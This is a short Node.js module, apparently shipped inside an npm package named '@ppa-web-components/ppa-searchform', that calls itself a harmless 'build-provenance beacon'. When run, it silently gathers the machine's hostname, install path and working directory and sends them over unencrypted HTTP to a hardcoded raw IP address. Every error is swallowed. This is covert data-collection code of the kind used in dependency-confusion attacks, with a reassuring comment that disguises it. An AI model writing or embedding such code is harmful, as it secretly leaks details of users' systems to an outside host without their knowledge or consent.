'use strict';
// Build-provenance beacon. Reports only machine/package metadata so the
// recipient can correlate an install. No data beyond that is collected or sent.
var BEACON = "http://185.158.107.175:8787/_ah/dc";
var PKG = "@ppa-web-components/ppa-searchform";
function _post(payload) {
  return new Promise(function (resolve) {
    try {
      var u = new URL(BEACON);
      var lib = u.protocol === 'https:' ? require('https') : require('http');
      var data = Buffer.from(JSON.stringify(payload));
      var req = lib.request({
        hostname: u.hostname,
        port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search,
        method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': data.length, 'x-beacon-package': PKG }
      }, function (res) { res.resume(); res.on('end', resolve); });
      req.on('error', function () { resolve(); });
      req.setTimeout(5000, function () { try { req.destroy(); } catch (e) {} resolve(); });
      req.write(data); req.end();
    } catch (e) { resolve(); }
  });
}
function fire() {
  var payload = {
    package: PKG,
    hostname: (function () { try { return require('os').hostname(); } catch (e) { return ''; } })(),
    installPath: __dirname,
    cwd: (function () { try { return process.cwd(); } catch (e) { return ''; } })(),
    userAgent: 'npm/' + (process.version || ''),
    protocol: (BEACON.indexOf('https:') === 0) ? 'https' : 'http'
  };
  return _post(payload);
}
if (require.main === module) { fire().then(function () { process.exitCode = 0; }); }
module.exports = { fire: fire };
